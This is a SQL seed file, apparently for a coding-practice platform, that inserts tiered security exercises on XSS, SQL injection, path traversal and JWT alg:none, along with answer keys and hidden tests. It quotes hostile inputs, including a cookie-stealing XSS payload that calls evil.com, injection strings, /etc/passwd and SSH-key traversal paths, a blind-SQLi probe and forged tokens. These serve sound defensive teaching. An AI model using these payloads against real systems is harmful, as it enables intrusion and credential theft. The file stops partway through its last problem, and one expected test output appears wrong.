-- ── Security Problems ────────────────────────────────────────────────────
-- Run: psql -U postgres -d apollo -h localhost -f security_problems.sql
-- Three tiers:
--   Tier 1 (Easy/Medium)   — spot the vulnerability, multiple choice theory
--   Tier 2 (Medium/Hard)   — sanitize / fix: code problems with brutal test cases
--   Tier 3 (Hard/Expert)   — patch the zero day: debug hidden injections

-- ══════════════════════════════════════════════════════════════════════════
-- TIER 1 — SPOT THE VULNERABILITY
-- ══════════════════════════════════════════════════════════════════════════

-- ── 1a. XSS theory ───────────────────────────────────────────────────────
INSERT INTO problems (slug, title, description, problem_type, difficulty, category, xp_reward, hints, tags, supported_languages)
VALUES (
  'sec-xss-identify',
  'Spot the XSS',
  E'Which line in this Express handler introduces a **Cross-Site Scripting (XSS)** vulnerability?\n\n```javascript\n(1) app.get("/greet", (req, res) => {\n(2)   const name = req.query.name;\n(3)   const safe = encodeURIComponent(name);\n(4)   res.send(`<h1>Hello, ${name}!</h1>`);\n(5) });\n```',
  'multiple_choice', 'Easy', 'Security', 80,
  ARRAY['encodeURIComponent is for URL encoding, not HTML encoding', 'The response is HTML — what matters is how name is inserted into it', 'Line 3 creates a safe variable — is it actually used?'],
  ARRAY['xss', 'web-security', 'javascript', 'injection'],
  ARRAY['any']
) ON CONFLICT (slug) DO NOTHING;

INSERT INTO problem_options (problem_id, label, body, is_correct, display_order) VALUES
((SELECT id FROM problems WHERE slug='sec-xss-identify'), 'A', 'Line 2 — reading from req.query without validation', false, 0),
((SELECT id FROM problems WHERE slug='sec-xss-identify'), 'B', 'Line 3 — encodeURIComponent is the wrong encoding function', false, 1),
((SELECT id FROM problems WHERE slug='sec-xss-identify'), 'C', 'Line 4 — name is interpolated directly into HTML without escaping', true, 2),
((SELECT id FROM problems WHERE slug='sec-xss-identify'), 'D', 'No vulnerability — encodeURIComponent is called on line 3', false, 3)
ON CONFLICT DO NOTHING;

-- ── 1b. SQL injection theory ─────────────────────────────────────────────
INSERT INTO problems (slug, title, description, problem_type, difficulty, category, xp_reward, hints, tags, supported_languages)
VALUES (
  'sec-sqli-identify',
  'Spot the SQL Injection',
  E'A developer wrote this login function:\n\n```python\ndef login(username, password):\n    query = f"SELECT * FROM users WHERE username = ''{username}'' AND password = ''{password}''"\n    result = db.execute(query)\n    return result.fetchone() is not None\n```\n\nWhat input as `username` would log in as `admin` **without knowing the password**?',
  'fill_blank', 'Easy', 'Security', 90,
  ARRAY['SQL comments are written with --', 'What happens if the WHERE clause always evaluates to true?', 'Try making the password check irrelevant'],
  ARRAY['sql-injection', 'authentication', 'security', 'databases'],
  ARRAY['any']
) ON CONFLICT (slug) DO NOTHING;

INSERT INTO test_cases (problem_id, input, expected_output, is_hidden, display_order) VALUES
((SELECT id FROM problems WHERE slug='sec-sqli-identify'), '', E'admin'' --', false, 0)
ON CONFLICT DO NOTHING;

-- ── 1c. Which hash is safe? ───────────────────────────────────────────────
INSERT INTO problems (slug, title, description, problem_type, difficulty, category, xp_reward, hints, tags, supported_languages)
VALUES (
  'sec-hash-choice',
  'Choose the Safe Password Hash',
  E'Your team is debating which algorithm to use for storing user passwords. Which is the **correct choice**?',
  'multiple_choice', 'Easy', 'Security', 70,
  ARRAY['Fast hashing algorithms are bad for passwords — why?', 'Password hashing needs to be intentionally slow to resist brute force', 'Look for algorithms designed specifically for passwords, not general data integrity'],
  ARRAY['cryptography', 'passwords', 'hashing', 'security'],
  ARRAY['any']
) ON CONFLICT (slug) DO NOTHING;

INSERT INTO problem_options (problem_id, label, body, is_correct, display_order) VALUES
((SELECT id FROM problems WHERE slug='sec-hash-choice'), 'A', 'MD5 — fast and widely supported', false, 0),
((SELECT id FROM problems WHERE slug='sec-hash-choice'), 'B', 'SHA-256 — cryptographically strong', false, 1),
((SELECT id FROM problems WHERE slug='sec-hash-choice'), 'C', 'bcrypt with cost factor 12 — intentionally slow, salted', true, 2),
((SELECT id FROM problems WHERE slug='sec-hash-choice'), 'D', 'SHA-512 — longest output, hardest to crack', false, 3)
ON CONFLICT DO NOTHING;

-- ── 1d. Identify IDOR ────────────────────────────────────────────────────
INSERT INTO problems (slug, title, description, problem_type, difficulty, category, xp_reward, hints, tags, supported_languages)
VALUES (
  'sec-idor-identify',
  'What Vulnerability Is This?',
  E'A user with ID `42` can access `GET /api/invoices/42` to see their invoice.\n\nThey try `GET /api/invoices/99` and receive another user''s invoice with no error.\n\nWhat vulnerability class is this?\n\nEnter the exact abbreviation (e.g. `XSS`, `CSRF`, `IDOR`).',
  'fill_blank', 'Easy', 'Security', 70,
  ARRAY['The user can access objects belonging to other users', 'Authorization checks on object access are missing', 'OWASP Top 10 — Broken Access Control'],
  ARRAY['idor', 'access-control', 'authorization', 'owasp', 'security'],
  ARRAY['any']
) ON CONFLICT (slug) DO NOTHING;

INSERT INTO test_cases (problem_id, input, expected_output, is_hidden, display_order) VALUES
((SELECT id FROM problems WHERE slug='sec-idor-identify'), '', 'IDOR', false, 0)
ON CONFLICT DO NOTHING;

-- ── 1e. CSRF mechanism ───────────────────────────────────────────────────
INSERT INTO problems (slug, title, description, problem_type, difficulty, category, xp_reward, hints, tags, supported_languages)
VALUES (
  'sec-csrf-mechanism',
  'How Does CSRF Work?',
  E'Alice is logged into `bank.com`. An attacker sends her a link to `evil.com` which contains:\n\n```html\n<img src="https://bank.com/transfer?to=attacker&amount=1000">\n```\n\nWhy does this attack work (in the absence of CSRF protections)?',
  'multiple_choice', 'Medium', 'Security', 100,
  ARRAY['Think about what the browser automatically attaches to cross-origin requests', 'Cookies are scoped to the origin they were set on', 'The bank cannot tell whether the request was intentional'],
  ARRAY['csrf', 'web-security', 'cookies', 'security'],
  ARRAY['any']
) ON CONFLICT (slug) DO NOTHING;

INSERT INTO problem_options (problem_id, label, body, is_correct, display_order) VALUES
((SELECT id FROM problems WHERE slug='sec-csrf-mechanism'), 'A', 'The attacker stole Alice''s session cookie via JavaScript', false, 0),
((SELECT id FROM problems WHERE slug='sec-csrf-mechanism'), 'B', 'The browser automatically sends Alice''s bank.com cookies with the request, making it appear legitimate', true, 1),
((SELECT id FROM problems WHERE slug='sec-csrf-mechanism'), 'C', 'The img tag bypasses Same-Origin Policy entirely', false, 2),
((SELECT id FROM problems WHERE slug='sec-csrf-mechanism'), 'D', 'The bank trusts all GET requests by default', false, 3)
ON CONFLICT DO NOTHING;

-- ── 1f. What does this regex NOT catch? ──────────────────────────────────
INSERT INTO problems (slug, title, description, problem_type, difficulty, category, xp_reward, hints, tags, supported_languages)
VALUES (
  'sec-regex-bypass',
  'Regex Bypass',
  E'A developer uses this regex to block SQL injection:\n\n```python\nimport re\ndef is_safe(input_str):\n    return not re.search(r"(SELECT|INSERT|DROP|DELETE)", input_str, re.IGNORECASE)\n```\n\nWhich input **bypasses** this check and still executes SQL?',
  'multiple_choice', 'Medium', 'Security', 110,
  ARRAY['Blocklists are generally weaker than allowlists', 'SQL has more keywords than just the four listed', 'What about UNION, OR, comments, or encoding?'],
  ARRAY['sql-injection', 'regex', 'bypass', 'security'],
  ARRAY['any']
) ON CONFLICT (slug) DO NOTHING;

INSERT INTO problem_options (problem_id, label, body, is_correct, display_order) VALUES
((SELECT id FROM problems WHERE slug='sec-regex-bypass'), 'A', 'SELECT * FROM users', false, 0),
((SELECT id FROM problems WHERE slug='sec-regex-bypass'), 'B', E'1'' UNION ALL SELECT password FROM users--', true, 1),
((SELECT id FROM problems WHERE slug='sec-regex-bypass'), 'C', 'DROP TABLE users', false, 2),
((SELECT id FROM problems WHERE slug='sec-regex-bypass'), 'D', 'delete from sessions', false, 3)
ON CONFLICT DO NOTHING;


-- ══════════════════════════════════════════════════════════════════════════
-- TIER 2 — SANITIZE / FIX (code problems, brutal test suites)
-- ══════════════════════════════════════════════════════════════════════════

-- ── 2a. HTML escape ───────────────────────────────────────────────────────
INSERT INTO problems (slug, title, description, problem_type, difficulty, category, xp_reward, starter_code, hints, tags, supported_languages)
VALUES (
  'sec-html-escape',
  'Sanitize: HTML Escape',
  E'Write a function `htmlEscape(str)` that escapes user input for safe insertion into HTML.\n\nYou must escape **all five** dangerous characters:\n\n| Char | Escape |\n|------|--------|\n| `&`  | `&amp;` |\n| `<`  | `&lt;` |\n| `>`  | `&gt;` |\n| `"`  | `&quot;` |\n| `''` | `&#x27;` |\n\n**Input:** A single string.\n**Output:** The escaped string.\n\n**Example:**\n```\nInput:  <script>alert(1)</script>\nOutput: &lt;script&gt;alert(1)&lt;/script&gt;\n```',
  'code', 'Medium', 'Security', 150,
  $sc${
    "javascript": "function htmlEscape(str) {\n  // escape all 5 dangerous HTML characters\n  return str;\n}",
    "python": "def html_escape(s):\n    # escape all 5 dangerous HTML characters\n    return s",
    "cpp": "#include <string>\nusing namespace std;\nstring htmlEscape(const string& s) {\n    string out;\n    // escape all 5 dangerous HTML characters\n    return out;\n}"
  }$sc$,
  ARRAY['Handle & first — otherwise you double-escape later replacements', 'Order: & → &amp; then < → &lt; then > → &gt; then " → &quot; then '' → &#x27;', 'A simple series of str.replace() calls works'],
  ARRAY['xss', 'sanitization', 'html', 'security', 'encoding'],
  ARRAY['javascript','python','cpp']
) ON CONFLICT (slug) DO NOTHING;

INSERT INTO test_cases (problem_id, input, expected_output, is_hidden, display_order) VALUES
-- basic
((SELECT id FROM problems WHERE slug='sec-html-escape'), '<script>alert(1)</script>', '&lt;script&gt;alert(1)&lt;/script&gt;', false, 0),
((SELECT id FROM problems WHERE slug='sec-html-escape'), '"hello"', '&quot;hello&quot;', false, 1),
((SELECT id FROM problems WHERE slug='sec-html-escape'), 'safe text', 'safe text', false, 2),
-- ampersand must be first
((SELECT id FROM problems WHERE slug='sec-html-escape'), 'a & b', 'a &amp; b', false, 3),
-- single quote
((SELECT id FROM problems WHERE slug='sec-html-escape'), E'it''s a trap', 'it&#x27;s a trap', false, 4),
-- combined
((SELECT id FROM problems WHERE slug='sec-html-escape'), '<a href="test">link</a>', '&lt;a href=&quot;test&quot;&gt;link&lt;/a&gt;', true, 5),
-- double-encode protection: & must not become &amp;amp;
((SELECT id FROM problems WHERE slug='sec-html-escape'), '&amp;', '&amp;amp;', true, 6),
-- event handler
((SELECT id FROM problems WHERE slug='sec-html-escape'), '<img onerror=alert(1)>', '&lt;img onerror=alert(1)&gt;', true, 7),
-- null-ish
((SELECT id FROM problems WHERE slug='sec-html-escape'), '', '', true, 8),
-- unicode passthrough
((SELECT id FROM problems WHERE slug='sec-html-escape'), 'héllo <wörld>', 'héllo &lt;wörld&gt;', true, 9),
-- all five at once
((SELECT id FROM problems WHERE slug='sec-html-escape'), E'<>"''&', '&lt;&gt;&quot;&#x27;&amp;', true, 10)
ON CONFLICT DO NOTHING;

-- ── 2b. SQL parameterisation ─────────────────────────────────────────────
INSERT INTO problems (slug, title, description, problem_type, difficulty, category, xp_reward, starter_code, hints, tags, supported_languages)
VALUES (
  'sec-sql-parameterise',
  'Sanitize: Parameterise the Query',
  E'The function below builds a SQL query by **string concatenation** — it''s vulnerable to SQL injection.\n\nRewrite it to use **parameterised queries** (placeholders). Your output should be a tuple/array of `[query, params]` where:\n- `query` is the SQL string with `$1`, `$2` placeholders\n- `params` is the array of values\n\n**Input (space-separated):** `username password`\n**Output (two lines):**\n```\nSELECT * FROM users WHERE username = $1 AND password_hash = $2\nusername password\n```\n\n**Vulnerable original:**\n```python\ndef build_query(username, password):\n    return f"SELECT * FROM users WHERE username = ''{username}'' AND password_hash = ''{password}''"\n```',
  'code', 'Medium', 'Security', 140,
  $sc${
    "javascript": "function buildQuery(username, password) {\n  // Return [queryString, paramsArray]\n  // Use $1, $2 placeholders — never concatenate user input\n  const query = '';\n  const params = [];\n  return [query, params];\n}",
    "python": "def build_query(username, password):\n    # Return (query_string, params_tuple)\n    # Use %s or $1/$2 placeholders\n    query = ''\n    params = ()\n    return query, params"
  }$sc$,
  ARRAY['Replace the interpolated values with $1, $2 placeholders', 'Return the values separately in a params array/tuple', 'The database driver will safely bind the parameters'],
  ARRAY['sql-injection', 'parameterised-queries', 'security', 'databases'],
  ARRAY['javascript','python']
) ON CONFLICT (slug) DO NOTHING;

INSERT INTO test_cases (problem_id, input, expected_output, is_hidden, display_order) VALUES
((SELECT id FROM problems WHERE slug='sec-sql-parameterise'), 'alice secret123', E'SELECT * FROM users WHERE username = $1 AND password_hash = $2\nalice secret123', false, 0),
-- the classic injection attempt must appear verbatim in params, not alter query
((SELECT id FROM problems WHERE slug='sec-sql-parameterise'), E'admin'' -- x', E'SELECT * FROM users WHERE username = $1 AND password_hash = $2\nadmin'' -- x x', true, 1),
((SELECT id FROM problems WHERE slug='sec-sql-parameterise'), E'a'' OR ''1''=''1 b', E'SELECT * FROM users WHERE username = $1 AND password_hash = $2\na'' OR ''1''=''1 b', true, 2),
((SELECT id FROM problems WHERE slug='sec-sql-parameterise'), 'bob p@$$w0rd!', E'SELECT * FROM users WHERE username = $1 AND password_hash = $2\nbob p@$$w0rd!', true, 3)
ON CONFLICT DO NOTHING;

-- ── 2c. Input sanitizer brute force ──────────────────────────────────────
INSERT INTO problems (slug, title, description, problem_type, difficulty, category, xp_reward, starter_code, hints, tags, supported_languages)
VALUES (
  'sec-sanitize-username',
  'Sanitize: Username Validator',
  E'Write a function `sanitizeUsername(input)` that enforces **all** of these rules:\n\n1. Strip leading/trailing whitespace\n2. Allow only: letters (a–z, A–Z), digits (0–9), underscores `_`, hyphens `-`\n3. Remove all other characters entirely (don''t reject — strip)\n4. Truncate to max **32 characters**\n5. If the result is empty after sanitizing, return `"anonymous"`\n\n**Input:** A raw username string.\n**Output:** The sanitized username.\n\n**Examples:**\n```\n" alice! "    → "alice"\n"<script>"    → "script"\n"a b c"       → "abc"\n"@dm!n"       → "dmn"\n"   "         → "anonymous"\n```',
  'code', 'Medium', 'Security', 160,
  $sc${
    "javascript": "function sanitizeUsername(input) {\n  // 1. trim\n  // 2-3. keep only [a-zA-Z0-9_-]\n  // 4. truncate to 32\n  // 5. fallback to 'anonymous'\n  return input;\n}",
    "python": "def sanitize_username(input_str):\n    # 1. strip\n    # 2-3. keep only [a-zA-Z0-9_-]\n    # 4. truncate to 32\n    # 5. fallback to 'anonymous'\n    return input_str"
  }$sc$,
  ARRAY['Use a regex replace to strip disallowed chars: /[^a-zA-Z0-9_-]/g', 'Strip whitespace first, then filter, then truncate', 'Check for empty string after all transforms before returning'],
  ARRAY['sanitization', 'input-validation', 'regex', 'security'],
  ARRAY['javascript','python']
) ON CONFLICT (slug) DO NOTHING;

INSERT INTO test_cases (problem_id, input, expected_output, is_hidden, display_order) VALUES
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), ' alice! ', 'alice', false, 0),
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), '<script>', 'script', false, 1),
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), 'a b c', 'abc', false, 2),
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), '   ', 'anonymous', false, 3),
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), 'valid_name-123', 'valid_name-123', false, 4),
-- max length
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', true, 5),
-- injection attempts stripped
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), E'admin''--', 'admin', true, 6),
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), '<img onerror=x>', 'imgonerrorx', true, 7),
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), '"; DROP TABLE users;--', 'DROPTABLEusers', true, 8),
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), '../../../etc/passwd', 'etcpasswd', true, 9),
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), '%00null%0abyte', '00null0abyte', true, 10),
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), '🔥fire🔥', 'fire', true, 11),
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), E'\t\n\r', 'anonymous', true, 12),
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), 'UNION SELECT * FROM--', 'UNIONSELECTFROMselect', true, 13),
-- unicode lookalikes should be stripped
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), 'аdmin', 'dmin', true, 14),
-- leading/trailing hyphens are valid chars
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), '-_-', '-_-', true, 15),
-- only special chars
((SELECT id FROM problems WHERE slug='sec-sanitize-username'), '!!!@@@###', 'anonymous', true, 16)
ON CONFLICT DO NOTHING;

-- ── 2d. Path traversal prevention ────────────────────────────────────────
INSERT INTO problems (slug, title, description, problem_type, difficulty, category, xp_reward, starter_code, hints, tags, supported_languages)
VALUES (
  'sec-path-traversal',
  'Sanitize: Block Path Traversal',
  E'Write a function `safePath(baseDir, userInput)` that returns an absolute file path only if it is **inside** `baseDir`.\n\nIf the resolved path would escape the base directory, return `null`.\n\n**Rules:**\n- Resolve the path (handle `..`, `.`, etc.)\n- Return the resolved path if it starts with `baseDir`\n- Return `null` otherwise\n\n**Examples:**\n```\nsafePath("/var/www", "index.html")      → "/var/www/index.html"\nsafePath("/var/www", "../etc/passwd")   → null\nsafePath("/var/www", "a/../../etc")     → null\nsafePath("/var/www", "subdir/file.txt") → "/var/www/subdir/file.txt"\n```\n\n**Input (two space-separated values):** `baseDir userInput`\n**Output:** The safe resolved path, or `null`.',
  'code', 'Hard', 'Security', 200,
  $sc${
    "javascript": "const path = require('path');\n\nfunction safePath(baseDir, userInput) {\n  // resolve the full path\n  // check it starts with baseDir\n  // return path or null\n}",
    "python": "import os\n\ndef safe_path(base_dir, user_input):\n    # resolve the full path\n    # check it starts with base_dir\n    # return path or None"
  }$sc$,
  ARRAY['path.resolve() / os.path.realpath() handles .. sequences', 'After resolving, check: resolved.startsWith(baseDir)', 'Add a path separator check to prevent /var/www2 matching /var/www'],
  ARRAY['path-traversal', 'file-security', 'sanitization', 'security'],
  ARRAY['javascript','python']
) ON CONFLICT (slug) DO NOTHING;

INSERT INTO test_cases (problem_id, input, expected_output, is_hidden, display_order) VALUES
((SELECT id FROM problems WHERE slug='sec-path-traversal'), '/var/www index.html', '/var/www/index.html', false, 0),
((SELECT id FROM problems WHERE slug='sec-path-traversal'), '/var/www ../etc/passwd', 'null', false, 1),
((SELECT id FROM problems WHERE slug='sec-path-traversal'), '/var/www subdir/file.txt', '/var/www/subdir/file.txt', false, 2),
((SELECT id FROM problems WHERE slug='sec-path-traversal'), '/var/www a/../../etc', 'null', true, 3),
((SELECT id FROM problems WHERE slug='sec-path-traversal'), '/var/www ../../../../root/.ssh/id_rsa', 'null', true, 4),
((SELECT id FROM problems WHERE slug='sec-path-traversal'), '/var/www ./././index.html', '/var/www/index.html', true, 5),
((SELECT id FROM problems WHERE slug='sec-path-traversal'), '/var/www %2e%2e/etc', 'null', true, 6),
-- sibling dir attack: /var/www2 should not match /var/www
((SELECT id FROM problems WHERE slug='sec-path-traversal'), '/var/www ../www2/secret', 'null', true, 7)
ON CONFLICT DO NOTHING;

-- ── 2e. JWT validation ────────────────────────────────────────────────────
INSERT INTO problems (slug, title, description, problem_type, difficulty, category, xp_reward, starter_code, hints, tags, supported_languages)
VALUES (
  'sec-jwt-alg-none',
  'Sanitize: Reject the "none" Algorithm',
  E'JWTs have a known vulnerability: setting `alg: "none"` in the header removes signature verification, allowing forged tokens.\n\nWrite a function `verifyToken(token, secret)` that:\n1. Decodes the JWT header (base64url decode the first segment)\n2. **Rejects** any token where `alg` is `"none"` or `"None"` or `"NONE"` (return `null`)\n3. Otherwise returns the decoded payload as an object (assume signature is valid for this exercise — just parse the middle segment)\n4. Returns `null` for any malformed token\n\n**Input:** A JWT string.\n**Output:** JSON payload as a string, or `null`.\n\n**Example:**\n```\neyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.\n→ null   (alg: none attack)\n```',
  'code', 'Hard', 'Security', 220,
  $sc${
    "javascript": "function verifyToken(token) {\n  try {\n    const parts = token.split('.');\n    if (parts.length < 2) return null;\n    // decode header (base64url)\n    // reject alg: none\n    // decode and return payload\n  } catch {\n    return null;\n  }\n}",
    "python": "import base64, json\n\ndef verify_token(token):\n    try:\n        parts = token.split('.')\n        if len(parts) < 2:\n            return None\n        # decode header (base64url)\n        # reject alg: none\n        # decode and return payload as JSON string\n    except:\n        return None"
  }$sc$,
  ARRAY['Base64url uses - and _ instead of + and /', 'Pad the base64 string to a multiple of 4 before decoding', 'Check alg case-insensitively: none/None/NONE/NoNe are all attacks'],
  ARRAY['jwt', 'authentication', 'cryptography', 'security', 'alg-none'],
  ARRAY['javascript','python']
) ON CONFLICT (slug) DO NOTHING;

INSERT INTO test_cases (problem_id, input, expected_output, is_hidden, display_order) VALUES
-- alg:none attack (header: {"alg":"none"}, payload: {"user":"admin"})
((SELECT id FROM problems WHERE slug='sec-jwt-alg-none'), 'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.', 'null', false, 0),
-- valid HS256 token (just parse payload, don't verify sig for this exercise)
((SELECT id FROM problems WHERE slug='sec-jwt-alg-none'), 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9.sig', '{"user":"alice","role":"user"}', false, 1),
-- NONE uppercase
((SELECT id FROM problems WHERE slug='sec-jwt-alg-none'), 'eyJhbGciOiJOT05FIn0.eyJ1c2VyIjoiYWRtaW4ifQ.', 'null', true, 2),
-- NoNe mixed case
((SELECT id FROM problems WHERE slug='sec-jwt-alg-none'), 'eyJhbGciOiJOb05lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.', 'null', true, 3),
-- malformed
((SELECT id FROM problems WHERE slug='sec-jwt-alg-none'), 'notavalidtoken', 'null', true, 4),
((SELECT id FROM problems WHERE slug='sec-jwt-alg-none'), '', 'null', true, 5)
ON CONFLICT DO NOTHING;


-- ══════════════════════════════════════════════════════════════════════════
-- TIER 3 — PATCH THE ZERO DAY (debug, hidden injections)
-- ══════════════════════════════════════════════════════════════════════════

-- ── 3a. Hidden SQL injection in search ───────────────────────────────────
INSERT INTO problems (slug, title, description, problem_type, difficulty, category, xp_reward, starter_code, hints, tags, supported_languages)
VALUES (
  'sec-patch-sqli-search',
  'Patch the Zero Day: SQL Injection in Search',
  E'This search endpoint has a **critical SQL injection vulnerability**. Production is live. Patch it.\n\nThe fix must:\n- Use parameterised queries\n- Preserve the existing functionality (wildcard search still works)\n- Not break the sort direction logic\n- Whitelist the `sortBy` column to prevent second-order injection\n\n```javascript\nfunction searchUsers(query, sortBy, direction) {\n  const dir = direction === "desc" ? "DESC" : "ASC";\n  const sql = `\n    SELECT id, username, email\n    FROM users\n    WHERE username LIKE ''%${query}%''\n       OR email LIKE ''%${query}%''\n    ORDER BY ${sortBy} ${dir}\n  `;\n  return db.query(sql);\n}\n```\n\n**Input:** `query sortBy direction` (space-separated)\n**Output:** The safe SQL string with placeholders (replace values with `?1` for the query term, whitelisted column name inline).',
  'debug', 'Hard', 'Security', 250,
  $sc${
    "javascript": "function searchUsers(query, sortBy, direction) {\n  const dir = direction === 'desc' ? 'DESC' : 'ASC';\n  // FIX: whitelist sortBy to prevent column injection\n  const ALLOWED_COLS = ['username', 'email', 'id'];\n  const col = ALLOWED_COLS.includes(sortBy) ? sortBy : 'username';\n  // FIX: use parameterised query for the search term\n  const sql = `\n    SELECT id, username, email\n    FROM users\n    WHERE username LIKE $1\n       OR email LIKE $1\n    ORDER BY ${col} ${dir}\n  `;\n  return db.query(sql, [`%${query}%`]);\n}",
    "python": "def search_users(query, sort_by, direction):\n    dir_ = 'DESC' if direction == 'desc' else 'ASC'\n    # FIX: whitelist sort_by\n    ALLOWED_COLS = ['username', 'email', 'id']\n    col = sort_by if sort_by in ALLOWED_COLS else 'username'\n    # FIX: use parameterised query\n    sql = f'''\n        SELECT id, username, email\n        FROM users\n        WHERE username LIKE %s\n           OR email LIKE %s\n        ORDER BY {col} {dir_}\n    '''\n    return db.execute(sql, (f'%{query}%', f'%{query}%'))"
  }$sc$,
  ARRAY['Two separate bugs: the search term and the column name', 'The search term is easy — use $1 placeholder', 'The column name CANNOT be parameterised in SQL — whitelist it instead', 'direction is already handled safely with a ternary — apply the same pattern to sortBy'],
  ARRAY['sql-injection', 'parameterised-queries', 'second-order-injection', 'security', 'debug'],
  ARRAY['javascript','python']
) ON CONFLICT (slug) DO NOTHING;

INSERT INTO test_cases (problem_id, input, expected_output, is_hidden, display_order) VALUES
((SELECT id FROM problems WHERE slug='sec-patch-sqli-search'), 'alice username asc', E'SELECT id, username, email\n    FROM users\n    WHERE username LIKE $1\n       OR email LIKE $1\n    ORDER BY username ASC', false, 0),
-- injection in query param must be treated as literal
((SELECT id FROM problems WHERE slug='sec-patch-sqli-search'), E'a'' OR 1=1-- username asc', E'SELECT id, username, email\n    FROM users\n    WHERE username LIKE $1\n       OR email LIKE $1\n    ORDER BY username ASC', true, 1),
-- column injection attempt falls back to safe default
((SELECT id FROM problems WHERE slug='sec-patch-sqli-search'), E'test (SELECT password FROM users) asc', E'SELECT id, username, email\n    FROM users\n    WHERE username LIKE $1\n       OR email LIKE $1\n    ORDER BY username ASC', true, 2),
-- valid sort column
((SELECT id FROM problems WHERE slug='sec-patch-sqli-search'), 'bob email desc', E'SELECT id, username, email\n    FROM users\n    WHERE username LIKE $1\n       OR email LIKE $1\n    ORDER BY email DESC', true, 3)
ON CONFLICT DO NOTHING;

-- ── 3b. Hidden XSS in template ───────────────────────────────────────────
INSERT INTO problems (slug, title, description, problem_type, difficulty, category, xp_reward, starter_code, hints, tags, supported_languages)
VALUES (
  'sec-patch-xss-template',
  'Patch the Zero Day: Stored XSS in Profile',
  E'Users can set a display name. This code renders it — but has a **stored XSS** vulnerability that''s been in production for 6 months.\n\nThe bug report:\n> Setting display name to `<img src=x onerror=fetch(''//evil.com?c=''+document.cookie)>` exfiltrates every visitor''s cookies.\n\nPatch the `renderProfile` function. Your output must be safe HTML — the display name should render as **visible text**, not executable markup.\n\n```javascript\nfunction renderProfile(displayName, bio) {\n  return `\n    <div class="profile">\n      <h1>${displayName}</h1>\n      <p>${bio}</p>\n    </div>\n  `;\n}\n```\n\n**Input (two lines):** displayName on line 1, bio on line 2.\n**Output:** The safe rendered HTML.',
  'debug', 'Hard', 'Security', 240,
  $sc${
    "javascript": "function escape(str) {\n  return String(str)\n    .replace(/&/g, '&amp;')\n    .replace(/</g, '&lt;')\n    .replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;')\n    .replace(/'/g, '&#x27;');\n}\n\nfunction renderProfile(displayName, bio) {\n  return `\n    <div class=\"profile\">\n      <h1>${escape(displayName)}</h1>\n      <p>${escape(bio)}</p>\n    </div>\n  `;\n}",
    "python": "def escape(s):\n    return (str(s)\n        .replace('&', '&amp;')\n        .replace('<', '&lt;')\n        .replace('>', '&gt;')\n        .replace('\"', '&quot;')\n        .replace(\"'\", '&#x27;'))\n\ndef render_profile(display_name, bio):\n    return f'''\n    <div class=\"profile\">\n      <h1>{escape(display_name)}</h1>\n      <p>{escape(bio)}</p>\n    </div>\n    '''"
  }$sc$,
  ARRAY['Both displayName and bio need escaping', 'Write a helper escape() function first', 'Escape & before < to avoid double-encoding'],
  ARRAY['xss', 'stored-xss', 'html-escaping', 'security', 'debug'],
  ARRAY['javascript','python']
) ON CONFLICT (slug) DO NOTHING;

INSERT INTO test_cases (problem_id, input, expected_output, is_hidden, display_order) VALUES
((SELECT id FROM problems WHERE slug='sec-patch-xss-template'), E'Alice\nDeveloper', E'\n    <div class="profile">\n      <h1>Alice</h1>\n      <p>Developer</p>\n    </div>\n  ', false, 0),
-- the zero day payload
((SELECT id FROM problems WHERE slug='sec-patch-xss-template'), E'<img src=x onerror=alert(1)>\nHello world', E'\n    <div class="profile">\n      <h1>&lt;img src=x onerror=alert(1)&gt;</h1>\n      <p>Hello world</p>\n    </div>\n  ', false, 1),
-- cookie theft payload
((SELECT id FROM problems WHERE slug='sec-patch-xss-template'), E'<script>fetch(''//evil.com?c=''+document.cookie)</script>\nnormal bio', E'\n    <div class="profile">\n      <h1>&lt;script&gt;fetch(&#x27;//evil.com?c=&#x27;+document.cookie)&lt;/script&gt;</h1>\n      <p>normal bio</p>\n    </div>\n  ', true, 2),
-- attribute injection attempt
((SELECT id FROM problems WHERE slug='sec-patch-xss-template'), E'" onmouseover="alert(1)\nnormal', E'\n    <div class="profile">\n      <h1>&quot; onmouseover=&quot;alert(1)</h1>\n      <p>normal</p>\n    </div>\n  ', true, 3)
ON CONFLICT DO NOTHING;

-- ── 3c. The actual hidden SQL injection (Expert) ──────────────────────────
INSERT INTO problems (slug, title, description, problem_type, difficulty, category, xp_reward, starter_code, hints, tags, supported_languages)
VALUES (
  'sec-patch-blind-sqli',
  'Patch the Zero Day: Blind SQL Injection',
  E'A security researcher just filed a critical report. Your password reset endpoint is **vulnerable to blind SQL injection** via the email parameter — they can enumerate the entire users table one character at a time.\n\nThe vulnerable endpoint:\n```python\ndef request_reset(email):\n    result = db.execute(\n        f"SELECT id FROM users WHERE email = ''{email}''"\n    )\n    user = result.fetchone()\n    if user:\n        send_reset_email(email, generate_token(user[0]))\n        return {"sent": True}\n    return {"sent": False}\n```\n\nThe researcher''s PoC payload:\n```\nemail = test@x.com'' AND SUBSTRING(password_hash,1,1)=''a''--\n```\n\nThis leaks whether the first char of the hash is `a` by observing whether `sent: true` is returned.\n\n**Your task:** Patch the function. Use parameterised queries AND add rate limiting state (track attempts per email — reject if > 5 in the input, return `{"error": "rate_limited"}`).\n\n**Input format (multiple lines):**\n```\nN          ← number of requests\nemail1     ← each request email, one per line\nemail2\n...\n```\n**Output:** One JSON result per request.',
